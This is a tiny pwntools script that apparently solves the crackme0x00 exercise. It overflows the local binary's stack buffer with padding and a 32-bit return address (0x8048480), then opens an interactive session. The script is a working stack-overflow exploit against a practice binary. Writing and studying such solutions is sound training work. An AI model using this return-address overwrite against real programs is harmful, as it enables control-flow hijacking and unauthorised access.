from pwn import *
sh = process('./crackme0x00')

payload = 'a'*0x18 + 'bbbb' + p32(0x8048480)

sh.sendline(payload)

sh.interactive()
